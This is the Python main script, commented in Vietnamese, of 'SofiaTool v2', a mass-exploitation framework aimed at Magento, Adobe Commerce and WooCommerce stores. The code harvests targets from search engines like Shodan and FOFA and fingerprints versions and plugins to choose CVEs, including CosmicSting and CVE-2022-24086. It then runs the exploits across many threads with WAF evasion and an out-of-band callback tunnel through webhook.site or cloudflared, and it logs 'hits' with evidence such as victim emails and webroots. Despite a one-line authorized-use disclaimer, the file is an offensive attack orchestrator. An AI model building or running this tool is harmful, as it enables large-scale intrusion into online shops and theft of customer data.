#!/usr/bin/env python3
"""SofiaTool v2 — framework khai thác ĐA NỀN TẢNG (Magento / Adobe Commerce /
WooCommerce).

CLI điều phối 5 pha, TỰ ĐỘNG nhận diện nền tảng từng target rồi định tuyến:

  PHA 1  discovery : PHA 1a lấy host (search engine fofa/zoomeye/censys/shodan/
                     urlscan/free HOẶC file -t) -> scope_guard. File -t có thể
                     chứa dòng GHIM CVE (pinned, 3 định dạng — discovery/
                     target_line.py, cờ --pin): Sofia chọn LUÔN CVE ghi trong
                     dòng với URL target, bỏ qua dò nền tảng/version.
                     PHA 1b NHẬN DIỆN NỀN TẢNG per-host (discovery/platform.py):
                       - magento / adobe_commerce -> pipeline `exploit/`
                         + dò version (discovery/version.py) -> chọn CVE theo
                           ngưỡng vá (CosmicSting / SessionReaper / 24086 /
                           StyleSmuggler).
                       - woocommerce -> pipeline `exploit_wo/`
                         + dò plugin/version (discovery/wo_select.py) -> chỉ
                           chạy CVE PHÙ HỢP target (13 CVE plugin WP/Woo).
                       - unknown -> bỏ qua.
  PHA 2  tunnel    : listener nội bộ (:8000) + tunnel webhook.site (whcli),
                     cloudflared dự phòng — CHỈ khởi động khi có target Magento
                     hoặc khi truyền --tunnel-url (WooCommerce không cần OOB).
  PHA 3  waf       : phát hiện WAF per-target -> chọn evasion (theo từng pipeline).
  PHA 4  exploit   : điều phối job theo (target, CVE) — Magento dùng `exploit/`,
                     WooCommerce dùng `exploit_wo/`. Danh sách target có thể
                     XEN KẼ Magento và WooCommerce, mỗi target đi đúng pipeline.
  PHA 5  report    : report.json / hits.csv / evidence / webhook + dọn dẹp.

Multi-target quy mô lớn: --classify-threads (song song hoá nhận diện),
--batch-size <N>, --resume (bỏ qua JOB (CVE, host) đã có kết quả).

CHỈ DÙNG CHO MỤC ĐÍCH KIỂM THỬ BẢO MẬT ĐƯỢC UỶ QUYỀN.
"""
import argparse
import sys
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

from core import config
from core.listener import OOBListener
from core.logger import (flush_report, get_logger, load_report,
                        save_report)
from core.ran_targets import get_store
from core.tunnel import create_tunnel
from discovery import cache as classify_cache
from discovery import (engines, engines_free, platform, target_line, version,
                       wo_select)
from discovery.scope_guard import filter_hosts
from discovery.target_queue import TargetQueue, normalize
from exploit import cve_2022_24086, cve_2026_75650, session_reaper
from exploit.env_hunter import run_target as env_hunter_run

log = get_logger()

MAGENTO_PLATFORMS = ("magento", "adobe_commerce")


# --------------------------------------------------------------- dispatch ----
def _mag_job(cve, t, listener, opts):
    """Chạy worker Magento tương ứng 1 CVE. Trả dict kết quả."""
    if cve == "CVE-2024-34102":
        return env_hunter_run(t, listener)
    if cve == "CVE-2025-54236":
        return session_reaper.run_target(t)
    if cve == "CVE-2022-24086/24087":
        return cve_2022_24086.run_target(t)
    if cve == "CVE-2026-75650":
        return cve_2026_75650.run_target(t, listener)
    return {"url": t.get("url"), "cve": cve, "hit": False,
            "error": "CVE không có worker Magento"}


def _run_job(job, listener, opts):
    """Chạy 1 job (target, CVE) theo đúng pipeline của nền tảng."""
    t = job["target"]
    cve = job["cve"]
    if job["engine"] == "magento":
        return _mag_job(cve, t, listener, opts)
    # WooCommerce / WordPress
    from exploit_wo import run_one
    return run_one(cve, t["url"], opts)


def build_parser():
    p = argparse.ArgumentParser(
        prog="sofia",
        description="SofiaTool v2 — khai thác đa nền tảng Magento / Adobe "
                    "Commerce / WooCommerce (tự nhận diện + chọn CVE theo target)",
        epilog="CHỈ dùng cho mục tiêu đã được uỷ quyền.",
    )
    src = p.add_mutually_exclusive_group(required=True)
    src.add_argument("--discover", action="store_true",
                     help="PHA 1: quét search-engine tìm target rồi nhận diện nền tảng")
    src.add_argument("-t", "--targets", metavar="FILE",
                     help="file chứa danh sách host/URL (1 dòng / target, # = chú "
                          "thích) hoặc dòng GHIM CVE (pinned, 3 định dạng — xem "
                          "README mục 'File target & dòng ghim CVE')")
    p.add_argument("-w", "--webhook", metavar="URL", default=None,
                   help="webhook Discord/Slack/plain để nhận thông báo hit "
                        "(mặc định: URL trong core/config.py)")
    p.add_argument("--threads", type=int,
                   default=getattr(config, "THREADS", 20),
                   help="số luồng exploit song song "
                        "(mặc định: %d)" % getattr(config, "THREADS", 20))
    p.add_argument("--classify-threads", type=int,
                   default=getattr(config, "CLASSIFY_THREADS", 16), metavar="N",
                   help="số luồng SONG SONG cho bước nhận diện nền tảng + dò "
                        "version/plugin (mặc định: %d; 0 = tự chọn)"
                        % getattr(config, "CLASSIFY_THREADS", 16))
    p.add_argument("--wait", type=int, default=30,
                   help="timeout chờ OOB callback mỗi payload (giây, mặc định: 30)")
    p.add_argument("--timeout", type=int, default=15,
                   help="timeout HTTP mỗi request tới target (giây, mặc định: 15)")
    p.add_argument("--scope", metavar="SUFFIX[,SUFFIX...]", default=None,
                   help="whitelist domain (vd: example.com,vn) — chặn host ngoài scope")
    p.add_argument("--engines", metavar="LIST", default="urlscan,free",
                   help="engine discovery: fofa,zoomeye,censys,shodan (trả phí) "
                        "hoặc urlscan,free (miễn phí — mặc định)")
    p.add_argument("--seeds", metavar="DOMAIN[,DOMAIN...]", default=None,
                   help="domain hạt giống cho nguồn free (crt.sh/wayback/otx)")
    p.add_argument("--engine-size", type=int, default=100,
                   help="số kết quả mỗi engine (mặc định: 100)")
    p.add_argument("--max-targets", type=int, default=None,
                   help="giới hạn số target thực tế được exploit (0 = không giới hạn)")
    p.add_argument("--listener-port", type=int, default=8000,
                   help="cổng listener nội bộ (mặc định: 8000)")
    p.add_argument("--tunnel", choices=["auto", "webhook.site", "cloudflare"],
                   default="auto",
                   help="loại tunnel: webhook.site ưu tiên (mặc định auto), "
                        "cloudflare dự phòng — hoặc ép dùng cloudflare")
    p.add_argument("--tunnel-url", metavar="URL", default=None,
                   help="ghi đè tunnel URL (vd đã có sẵn) — bỏ qua tunnel manager")
    # ---- định tuyến nền tảng (MAGENTO / ADOBE COMMERCE / WOOCOMMERCE) ----
    p.add_argument("--platform",
                   choices=["auto", "magento", "adobe_commerce", "woocommerce"],
                   default="auto",
                   help="lọc/định tuyến pipeline: auto = tự nhận diện mỗi target "
                        "(mặc định); magento = chỉ xử lý Magento/Adobe Commerce; "
                        "adobe_commerce = chỉ Adobe Commerce; woocommerce = chỉ "
                        "WooCommerce")
    # ---- PIN CVE theo dòng target (định dạng có sẵn CVE) ----
    p.add_argument("--pin",
                   action=argparse.BooleanOptionalAction,
                   default=True,
                   help="tự CHỌN LUÔN CVE ghi trong dòng target để exploit, bỏ qua "
                        "dò version/nền tảng. Nhận 3 dạng: '<url> [CVE-...] info', "
                        "'[version] <url> <ver> — khả năng CVE-... — dính trong ...' "
                        "(Magento) và '[version] <url> <slug> <ver> — khả năng "
                        "CVE-...' (WooCommerce) (mặc định: bật; tắt bằng --no-pin)")
    # ---- tối ưu danh sách lớn: cache phân loại (PHA 1b) ----
    p.add_argument("--no-classify-cache", action="store_true",
                   help="TẮT cache phân loại: luôn dò lại nền tảng/version/plugin "
                        "cho mọi host (mặc định bật cache -> chạy lại danh sách "
                        "lớn/--resume không chạm mạng lại)")
    p.add_argument("--classify-ttl", type=int,
                   default=getattr(config, "CLASSIFY_TTL", 86400), metavar="SEC",
                   help="thời gian sống của cache phân loại (giây; mặc định %d = "
                        "24h; 0 = không hết hạn)"
                        % getattr(config, "CLASSIFY_TTL", 86400))
    p.add_argument("--wo-fallback", choices=["all", "none"], default="all",
                   help="khi target WooCommerce nhưng KHÔNG detect được plugin nào "
                        "trong KB: 'all' = chạy toàn bộ CVE (mặc định, an toàn); "
                        "'none' = bỏ qua target (tối ưu tốc độ)")
    p.add_argument("--wo-only", metavar="LIST", default=None,
                   help="chỉ chạy CVE Woo khớp (CVE/slug/module, phẩy)")
    p.add_argument("--wo-exclude", metavar="LIST", default=None,
                   help="loại CVE Woo khớp (CVE/slug/module, phẩy)")
    p.add_argument("--wo-waf", action="store_true",
                   help="bật nhận diện WAF + né WAF cho pipeline WooCommerce")
    p.add_argument("--wo-evade", action="store_true",
                   help="ép gửi payload Woo qua biến thể né WAF (ngụ ý --wo-waf)")
    p.add_argument("--wo-proxy", metavar="URL", default=None,
                   help="proxy HTTP(S) cho pipeline WooCommerce")
    p.add_argument("--wo-rate", type=float, default=None,
                   help="giới hạn ~N request/giây cho pipeline WooCommerce")
    # ---- multi-target: batch + resume (SOFIA-MT) ----
    p.add_argument("--batch-size", type=int,
                   default=getattr(config, "BATCH_SIZE", 50), metavar="N",
                   help="số JOB xử lý mỗi batch (mặc định: %d = 50; "
                        "0 = tất cả một lần; dùng cho danh sách target lớn)"
                        % getattr(config, "BATCH_SIZE", 50))
    p.add_argument("--resume",
                   action=argparse.BooleanOptionalAction,
                   default=getattr(config, "RESUME", True),
                   help="bỏ qua JOB (CVE, host) đã có kết quả trong "
                        "report/report.json (mặc định: %s; kết hợp --batch-size)"
                        % ("bật" if getattr(config, "RESUME", True) else "tắt"))
    # ---- sổ target đã kiểm tra: ran_target.json ----
    p.add_argument("--ran-file", metavar="FILE",
                   default=getattr(config, "RAN_TARGET_FILE", None),
                   help="sổ target đã kiểm tra (mặc định: ran_target.json ở "
                        "thư mục sofia)")
    p.add_argument("--skip-ran",
                   action=argparse.BooleanOptionalAction,
                   default=getattr(config, "SKIP_RAN", True),
                   help="mỗi target chạy xong tự ghi vào --ran-file rồi BỎ QUA "
                        "target đó ở lần chạy sau (mặc định: %s; tắt bằng "
                        "--no-skip-ran)"
                        % ("bật" if getattr(config, "SKIP_RAN", True) else "tắt"))
    # ---- hiệu năng I/O + HTTP (danh sách lớn) ----
    p.add_argument("--http-pool", type=int,
                   default=getattr(config, "HTTP_POOL", 50), metavar="N",
                   help="kích thước connection pool HTTP dùng chung cho bước nhận "
                        "diện/dò version (mặc định: %d)"
                        % getattr(config, "HTTP_POOL", 50))
    p.add_argument("--http-retries", type=int,
                   default=getattr(config, "HTTP_RETRIES", 2), metavar="N",
                   help="số lần retry cho request CHỈ ĐỌC (GET/HEAD) khi lỗi tạm "
                        "thời (mặc định: %d; POST KHÔNG retry để tránh lặp payload)"
                        % getattr(config, "HTTP_RETRIES", 2))
    p.add_argument("--flush-every", type=int,
                   default=getattr(config, "REPORT_FLUSH_EVERY", 0), metavar="N",
                   help="hợp nhất report/report.json mỗi N job ghi vào journal "
                        "(mặc định: %d = chỉ hợp nhất ở cuối; >0 an toàn hơn khi "
                        "tiến trình bị kill cứng)"
                        % getattr(config, "REPORT_FLUSH_EVERY", 0))
    return p


# ---------------------------------------------------------- PHA 1b classify -
def _platform_allows(t, args):
    """Lọc pipeline theo --platform (auto | magento | adobe_commerce | woocommerce)."""
    p = getattr(args, "platform", "auto")
    if p in (None, "auto"):
        return True
    if p == "magento":
        return t.get("platform") in MAGENTO_PLATFORMS
    if p == "adobe_commerce":
        return t.get("platform") == "adobe_commerce"
    if p == "woocommerce":
        return t.get("platform") == "woocommerce"
    return True


def _classify_host_raw(host, args):
    """Nhận diện nền tảng + dò version/plugin cho 1 host (KHÔNG lọc --platform).

    Trả dict target đã làm giàu (url/platform/engine/version/cves) hoặc None.
    Không áp --platform ở đây để kết quả còn tái dùng được cho cache phân loại
    (đổi --platform giữa các lần chạy vẫn dùng chung cache).
    """
    # want_home=True: PHA 1b lấy trang chủ 1 LẦN rồi tái dùng cho cả nhận diện
    # nền tảng, dò version và dò plugin Woo -> bỏ 2-4 GET '/' mỗi host.
    info = platform.detect(host, want_home=True)
    home_text = info.pop("_home_text", "") or ""
    plat = info.get("platform", "unknown")
    base = info.get("url") or host

    if plat in MAGENTO_PLATFORMS:
        ver = version.fetch_version(base, home_text=home_text)
        cves = version.applicable_cves(ver)
        return {"url": base, "platform": plat, "engine": "magento",
                "edition": info.get("edition"), "signals": info.get("signals"),
                "version": ver.text if ver else None, "cves": cves}

    if plat == "woocommerce":
        sel = wo_select.select(base, timeout=args.timeout,
                               fallback=args.wo_fallback,
                               only=args.wo_only, exclude=args.wo_exclude,
                               home_text=home_text)
        return {"url": base, "platform": "woocommerce", "engine": "wordpress",
                "signals": info.get("signals"),
                "version": sel.get("woocommerce_version"),
                "plugins": sel.get("plugins"), "wo_mode": sel.get("mode"),
                "wo_reasons": sel.get("reasons"), "cves": sel.get("cves") or []}

    return None


def _classify_host(host, args):
    """Như _classify_host_raw nhưng áp bộ lọc --platform (giữ API cũ)."""
    t = _classify_host_raw(host, args)
    return t if (t and _platform_allows(t, args)) else None


def _facts_from_target(t):
    """Trích SỰ THẬT nhận diện (không gồm quyết định CVE) để lưu cache."""
    if t.get("engine") == "magento":
        return "magento", {
            "platform": t.get("platform"), "engine": "magento",
            "edition": t.get("edition"), "signals": t.get("signals"),
            "version": t.get("version"),
        }
    return "woocommerce", {
        "platform": "woocommerce", "engine": "wordpress",
        "signals": t.get("signals"), "plugins": t.get("plugins") or {},
        "woocommerce_version": t.get("version"),
    }


def _target_from_cache(url, kind, facts, args):
    """Dựng lại target từ cache và TÍNH LẠI cves theo KB hiện tại (offline)."""
    if kind == "magento":
        return {"url": url, "platform": facts.get("platform") or "magento",
                "engine": "magento", "edition": facts.get("edition"),
                "signals": facts.get("signals"), "version": facts.get("version"),
                "cves": version.applicable_cves(facts.get("version")),
                "cached": True}
    dec = wo_select.choose_cves(facts.get("plugins") or {},
                                fallback=args.wo_fallback,
                                only=args.wo_only, exclude=args.wo_exclude)
    return {"url": url, "platform": "woocommerce", "engine": "wordpress",
            "signals": facts.get("signals"),
            "version": facts.get("woocommerce_version"),
            "plugins": facts.get("plugins") or {}, "wo_mode": dec["mode"],
            "wo_reasons": dec["reasons"], "cves": dec["cves"], "cached": True}


def _classify_and_push(hosts, source, args, q):
    """Nhận diện SONG SONG + tái dùng cache, rồi push vào queue (dedup).

    Tối ưu danh sách lớn: host đã có trong cache phân loại (còn hạn TTL) được
    dùng lại NGAY, KHÔNG chạm mạng — phần chạm mạng (platform/version/plugin)
    chỉ chạy cho host thật sự mới. Điều này giúp các lần chạy lại / --resume
    trên danh sách lớn nhanh hơn nhiều lần.
    """
    hosts = filter_hosts(hosts)
    if not hosts:
        return 0

    # Bỏ qua target đã kiểm tra XONG ở lần chạy trước (ran_target.json) — không
    # chạm mạng lại, kể cả bước nhận diện nền tảng/version/plugin.
    ran = get_store()
    if ran.enabled:
        before = len(hosts)
        hosts = ran.filter_hosts(hosts)
        if len(hosts) != before:
            log.info("PHA 1b: bỏ qua %d host đã kiểm tra (ran_target.json)",
                     before - len(hosts))
        if not hosts:
            return 0

    # dedup theo key chuẩn hoá (list lớn hay lặp lại host) -> tránh dò mạng 2 lần
    seen_keys, uniq = set(), []
    for h in hosts:
        k = classify_cache.key_of(h)
        if k in seen_keys:
            continue
        seen_keys.add(k)
        uniq.append(h)
    if len(uniq) != len(hosts):
        log.info("PHA 1b: bỏ %d host trùng trong danh sách", len(hosts) - len(uniq))
    hosts = uniq

    cache = classify_cache.ClassifyCache(
        enabled=not getattr(args, "no_classify_cache", False),
        ttl=getattr(args, "classify_ttl", None))

    enriched, todo = [], []
    for h in hosts:
        e = cache.get(h)
        if e is not None:
            enriched.append(_target_from_cache(classify_cache.key_of(h),
                                               e["kind"], e["facts"], args))
        else:
            todo.append(h)
    n_cached = len(enriched)

    if todo:
        workers = args.classify_threads or min(48, max(4, len(todo)))

        def _safe(h):
            try:
                return h, _classify_host_raw(h, args)
            except Exception as e:  # không để 1 host làm chết cả lượt
                log.debug("classify lỗi [%s]: %s", h, e)
                return h, None

        with ThreadPoolExecutor(max_workers=workers) as pool:
            futs = {pool.submit(_safe, h): h for h in todo}
            for fut in as_completed(futs):
                h, t = fut.result()
                if t is None:
                    continue
                kind, facts = _facts_from_target(t)
                cache.put(h, kind, facts)
                enriched.append(t)
        cache.flush()

    pushed = mag = woo = 0
    for t in enriched:
        if not _platform_allows(t, args):
            continue
        if q.push(t["url"], source, platform=t["platform"],
                  engine=t["engine"], edition=t.get("edition"),
                  version=t.get("version"), plugins=t.get("plugins"),
                  cves=t.get("cves"), wo_mode=t.get("wo_mode")):
            pushed += 1
            tag = " [cache]" if t.get("cached") else ""
            if t["engine"] == "magento":
                mag += 1
                log.info("platform=%s version=%s -> CVE %s: %s%s",
                         t["platform"].upper(), t.get("version"),
                         ",".join(t["cves"]) or "(không có)", t["url"], tag)
            else:
                woo += 1
                log.info("platform=WOOCOMMERCE v=%s mode=%s -> CVE: %s%s",
                         t.get("version"), t.get("wo_mode"),
                         ",".join(t["cves"]) or "(không có)", tag)
    st = cache.stats()
    log.info("PHA 1b: %d target nhận diện (%d Magento/Adobe, %d WooCommerce) "
             "— cache hit %d/%d%s", pushed, mag, woo, n_cached, len(hosts),
             "" if st["enabled"] else " (cache tắt)")
    return pushed


# ------------------------------------------------------------------ PHA 1a
def phase_discovery(args):
    """Quét search-engine -> scope_guard -> nhận diện nền tảng -> queue."""
    log.info("PHA 1: discovery qua %s", args.engines)
    enabled = [e.strip() for e in args.engines.split(",") if e.strip()]
    free_names = {e for e in enabled
                  if e == "free" or e in engines_free.ENGINES_FREE
                  or e in engines_free.SOURCES_SEED}
    paid = [e for e in enabled if e not in free_names]
    raw = engines.run_all(paid, size=args.engine_size) if paid else []
    if free_names:
        seeds = [s for s in (getattr(args, "seeds", None) or "").split(",")
                 if s.strip()]
        raw.extend(engines_free.run_free(seed_domains=seeds,
                                         size=args.engine_size))
    hosts = [h for h, _ in raw]
    q = TargetQueue()
    _classify_and_push(hosts, "discover", args, q)
    return q


# ------------------------------------------------------- GHIM CVE (pinned) ---
def _push_pinned(rec, args, q, pushed_urls=None):
    """Định tuyến 1 dòng GHIM CVE (pinned): chọn LUÔN CVE ghi trong dòng.

    Dùng target_line.resolve_pinned để lấy engine/platform/CVE chạy được — KHÔNG
    chạm mạng dò nền tảng/version (khác path classify). Trả URL nếu đã push
    pinned; None nếu không ghim được:
      - CVE ghim không có worker  -> fallback nhận diện nền tảng như cũ;
      - ngoài scope / --platform chặn -> bỏ hẳn target (không fallback).
    `pushed_urls` (tuỳ chọn) thu URL đã push để caller bỏ dòng trùng lặp.
    """
    url = rec["url"]
    if not filter_hosts([url]):          # scope_guard tự log cảnh báo
        return None
    ran = get_store()
    if ran.enabled and not ran.filter_hosts([url]):
        log.info("pinned: bỏ qua %s (đã kiểm tra xong — ran_target.json)", url)
        return None

    engine, plat, cves, dropped = target_line.resolve_pinned(rec)
    if not engine or not cves:
        log.info("pinned: %s không ghim được CVE %s (không có worker) — "
                 "fallback nhận diện nền tảng", url,
                 ", ".join(rec.get("cves") or []) or "-")
        _classify_and_push([url], "pinned-fallback", args, q)
        return None
    if not _platform_allows({"platform": plat}, args):
        log.info("pinned: bỏ qua %s (--platform=%s chặn pipeline %s)",
                 url, args.platform, plat)
        return None
    if q.push(url, "pinned", platform=plat, engine=engine,
              version=rec.get("version"), slug=rec.get("slug"),
              cves=cves, dropped=dropped, pinned=True):
        if pushed_urls is not None:
            pushed_urls.add(url.lower())
        note = f" — bỏ CVE: {', '.join(dropped)}" if dropped else ""
        log.info("pinned: %s -> CVE %s (engine %s)%s", url,
                 ", ".join(cves), engine, note)
        return url
    log.debug("pinned: %s trùng target đã có trong queue", url)
    return url


def phase_targets_file(args):
    """Đọc file -t -> định tuyến theo dòng: GHIM CVE hoặc host trần -> queue.

    Dòng GHIM CVE (target_line.parse_line thấy CVE) khi --pin bật: chọn LUÔN
    CVE trong dòng, BỎ QUA dò nền tảng/version (_push_pinned). Dòng host trần,
    --no-pin, hoặc CVE ghim không có worker: đi nhận diện nền tảng như cũ.
    """
    q = TargetQueue()
    try:
        with open(args.targets, encoding="utf-8") as f:
            lines = [ln.strip() for ln in f
                     if ln.strip() and not ln.lstrip().startswith("#")]
    except OSError as e:
        log.error("không đọc được file target: %s", e)
        sys.exit(2)

    pinned_recs, plain = [], []
    for ln in lines:
        rec = target_line.parse_line(ln)
        if rec is None:                    # dòng rác / không có URL — để path cũ xử lý
            plain.append(ln)
        elif args.pin and rec.get("cves"):
            pinned_recs.append(rec)
        else:                              # host/URL trần (hoặc --no-pin)
            plain.append(rec["url"])

    pinned_urls = set()
    if pinned_recs:
        log.info("PHA 1a: %d/%d dòng GHIM CVE (pinned) — chọn luôn CVE trong "
                 "dòng, bỏ dò nền tảng/version", len(pinned_recs), len(lines))
        for rec in pinned_recs:
            _push_pinned(rec, args, q, pinned_urls)
    if pinned_urls:                        # bỏ dòng trùng URL đã ghim (đỡ dò lại)
        kept = []
        for h in plain:
            u = (normalize(h) or "").lower()
            if u and u in pinned_urls:
                continue
            kept.append(h)
        if len(kept) != len(plain):
            log.info("PHA 1a: bỏ %d dòng trùng URL với dòng pinned đã ghim",
                     len(plain) - len(kept))
        plain = kept

    if plain:                          # không gọi classify cho danh sách rỗng
        _classify_and_push(plain, "manual", args, q)
    return q


# ------------------------------------------------------------------ PHA 2
def phase_tunnel(listener, args):
    """Khởi động listener + tunnel. Trả (tunnel_base, tunnel_mgr).

    Thứ tự ưu tiên: webhook.site → cloudflare (trừ khi --tunnel cloudflare).
    """
    listener.start()
    if args.tunnel_url:
        base = args.tunnel_url.rstrip("/")
        log.info("dùng tunnel URL ghi đè: %s", base)
        return base, None
    order = ["webhook.site", "cloudflare"]
    if args.tunnel == "cloudflare":
        order = ["cloudflare"]
    for name in order:
        tunnel = create_tunnel(port=args.listener_port, prefer=name)
        if not tunnel.available:
            log.warning("tunnel %s không khả dụng (thiếu binary) — bỏ qua", name)
            continue
        base = tunnel.start()
        if base:
            return base, tunnel
        tunnel.stop()
        log.warning("tunnel %s start thất bại — thử tunnel kế tiếp", name)
    log.error("không lấy được tunnel URL (webhook.site + cloudflare đều fail) "
              "— dùng --tunnel-url")
    return None, None


# ------------------------------------------------------------ PHA 3/4/5
def _completed_jobs():
    """Tập (CVE, host) đã có kết quả trong report.json (cho --resume).

    Một job coi là xong khi entry có time/hit/error. Resume ở mức JOB giúp
    danh sách lớn chạy lại chỉ tiếp tục đúng phần còn thiếu.
    """
    done = set()
    for e in load_report().get("targets", []):
        if not isinstance(e, dict):
            continue
        url = (e.get("url") or "").lower()
        cve = str(e.get("cve") or "").upper()
        if not url or not cve:
            continue
        if e.get("time") is not None or e.get("hit") is not None \
                or e.get("error") is not None:
            done.add((cve, url))
    return done


def _build_targets(q, args):
    targets = []
    while not q.empty():
        t = q.pop()
        if not t:
            continue
        targets.append(t)
        if args.max_targets and len(targets) >= args.max_targets:
            break
    return targets


def _collect_futures(futs, results):
    """Gom kết quả worker; 1 worker crash không làm chết cả batch."""
    for fut in as_completed(futs):
        job = futs[fut]
        try:
            r = fut.result()
        except Exception as e:  # bảo vệ pool
            log.exception("[%s] worker crash (%s)", job["url"], job["cve"])
            r = {"url": job["url"], "cve": job["cve"], "hit": False,
                 "error": f"worker: {e}"}
        if not isinstance(r, dict):
            r = {"url": job["url"], "cve": job["cve"], "hit": False,
                 "error": "module trả về không phải dict"}
        r.setdefault("cve", job["cve"])
        r.setdefault("url", job["url"])
        results.append(r)
        if r.get("hit"):
            log.info("*** HIT: %s [%s] -> %s", r["url"], r.get("cve"),
                     r.get("evidence_dir") or r.get("evidence") or "-")


def _mark_ran(ran, expected, done):
    """Ghi vào sổ ran_target.json những target đã hoàn tất MỌI job (CVE)."""
    if not ran.enabled:
        return
    ready = [url for url, total in expected.items() if done.get(url, 0) >= total]
    if ready:
        n = ran.add_many(ready, flush=False)
        if n:
            log.info("ran_target.json: +%d target đã kiểm tra xong (tổng %d)",
                     n, len(ran))
    ran.flush()


def phase_exploit(targets, listener, args, opts, resume_jobs=None):
    """Chạy job (target, CVE) theo batch — Magento/Woo đi đúng pipeline.

    Đồng thời ghi sổ ran_target.json: một target được coi là ĐÃ KIỂM TRA XONG
    khi MỌI job (CVE) của nó đã có kết quả (hit/miss/error), hoặc khi nó không
    có CVE nào phù hợp — để lần chạy sau bỏ qua (--skip-ran).
    """
    ran = get_store()
    jobs = []
    for t in targets:
        cves = t.get("cves") or []
        if not cves:
            log.info("  skip %s (platform=%s): không CVE nào khớp "
                     "(version=%s mode=%s)", t["url"], t.get("platform"),
                     t.get("version"), t.get("wo_mode"))
            # Đã kiểm tra xong (không có CVE phù hợp) -> ghi sổ để lần sau bỏ qua.
            ran.add(t["url"])
            continue
        for cve in cves:
            jobs.append({"url": t["url"], "cve": cve, "target": t,
                         "engine": t.get("engine")})

    # Số job KỲ VỌNG mỗi target -> nhận biết target nào đã chạy xong hoàn toàn.
    expected = Counter(j["url"] for j in jobs)
    done = Counter()

    if resume_jobs:
        before = len(jobs)
        kept = []
        for j in jobs:
            if (j["cve"].upper(), j["url"].lower()) in resume_jobs:
                done[j["url"]] += 1   # đã xong ở lần chạy trước -> tính là xong
            else:
                kept.append(j)
        jobs = kept
        log.info("--resume: bỏ %d/%d job đã xử lý lần trước",
                 before - len(jobs), before)

    # Ghi sổ các target đã hoàn tất ngay (vd: --resume đã phủ hết job của nó).
    _mark_ran(ran, expected, done)

    if not jobs:
        log.info("không còn job nào để chạy (sau --resume/lọc) — thoát")
        return []

    batch_size = args.batch_size if args.batch_size and args.batch_size > 0 \
        else len(jobs)
    n_batches = (len(jobs) + batch_size - 1) // batch_size
    results = []
    for bi, start in enumerate(range(0, len(jobs), batch_size), 1):
        chunk = jobs[start:start + batch_size]
        mag = sum(1 for j in chunk if j["engine"] == "magento")
        woo = len(chunk) - mag
        log.info("PHA 3/4: batch %d/%d — %d job (%d Magento, %d Woo), %d luồng, "
                 "WAIT_CALLBACK=%ds", bi, n_batches, len(chunk), mag, woo,
                 args.threads, config.WAIT_CALLBACK)
        hits_before = sum(1 for r in results if r.get("hit"))
        results_before = len(results)
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futs = {pool.submit(_run_job, j, listener, opts): j for j in chunk}
            _collect_futures(futs, results)
        # Đếm job mới xong theo từng target -> ghi sổ target vừa hoàn tất.
        for r in results[results_before:]:
            done[r["url"]] += 1
        _mark_ran(ran, expected, done)
        total_hits = sum(1 for r in results if r.get("hit"))
        hits_in = total_hits - hits_before  # theo hiệu số -> đúng dù kết quả về lộn thứ tự
        log.info("batch %d/%d xong: %d hit mới (tổng %d/%d job tới nay)",
                 bi, n_batches, hits_in, total_hits, len(jobs))
    ran.flush()
    return results


def phase_report(results):
    """Ghi summary vào report.json + in bảng kết quả."""
    hits = [r for r in results if r.get("hit")]
    data = load_report()
    data["summary"] = {
        "total": len(results),
        "hits": len(hits),
        "generated": data.get("generated"),
    }
    save_report(data)
    log.info("PHA 5: %d/%d job trúng, chi tiết trong report/report.json",
             len(hits), len(results))
    for r in sorted(results, key=lambda x: not x.get("hit")):
        if r.get("hit"):
            ev = (r.get("evidence_dir") or r.get("webroot")
                  or r.get("snippet") or r.get("victim_email")
                  or r.get("evidence") or "-")
            log.info("  HIT  %s  [%s]  %s", r["url"], r.get("cve"), ev)
        else:
            log.info("  miss %s  [%s]  (%s)", r["url"], r.get("cve"),
                     r.get("error") or "patched/not vuln")
    return hits


def _wo_opts(args):
    o = {"waf": bool(args.wo_waf or args.wo_evade),
         "evade": bool(args.wo_evade)}
    if args.wo_proxy:
        o["proxy"] = args.wo_proxy
    if args.wo_rate:
        o["rate"] = args.wo_rate
    if args.timeout:
        o["timeout"] = args.timeout
    return o


def main(argv=None):
    args = build_parser().parse_args(argv)
    config.configure(args)

    # ---------------- PHA 1
    q = phase_discovery(args) if args.discover else phase_targets_file(args)
    if len(q) == 0:
        log.error("không có target nào nhận diện được — dừng")
        sys.exit(1)

    targets = _build_targets(q, args)
    if not targets:
        log.error("không có target nào để exploit — dừng")
        sys.exit(1)
    n_mag = sum(1 for t in targets if t.get("engine") == "magento")
    n_woo = len(targets) - n_mag
    log.info("targets: %d (%d Magento/Adobe, %d WooCommerce)",
             len(targets), n_mag, n_woo)

    # ---------------- PHA 2 (chỉ khi cần OOB)
    listener = tunnel = None
    tunnel_base = None
    need_tunnel = bool(args.tunnel_url) or n_mag > 0
    if need_tunnel:
        listener = OOBListener(port=args.listener_port)
        tunnel_base, tunnel = phase_tunnel(listener, args)
        if not tunnel_base:
            listener.stop()
            sys.exit(2)
        listener.set_tunnel_base(tunnel_base)
        log.info("tunnel_base = %s (listener %s:%d)", tunnel_base,
                 config.LISTENER_HOST, args.listener_port)
    else:
        log.info("không có target Magento — bỏ qua tunnel (WooCommerce không "
                 "cần OOB callback)")

    # ---------------- PHA 3/4/5
    opts = _wo_opts(args)
    results, hits = [], []
    try:
        resume_jobs = _completed_jobs() if args.resume else None
        results = phase_exploit(targets, listener, args, opts,
                                resume_jobs=resume_jobs)
        hits = phase_report(results)
    except KeyboardInterrupt:
        log.warning("Ctrl-C — dọn dẹp và thoát")
        phase_report(results or [])
    finally:
        # Hợp nhất journal -> report.json trước khi thoát (kể cả Ctrl-C/lỗi).
        try:
            flush_report(force=True)
        except Exception as e:  # không để lỗi flush che lỗi gốc
            log.debug("flush_report lỗi: %s", e)
        if tunnel:
            tunnel.stop()
        if listener:
            listener.stop()

    log.info("SofiaTool v2 kết thúc: %d hit / %d job. Evidence: evidence/",
             len(hits), len(results))
    sys.exit(0)


if __name__ == "__main__":
    main()
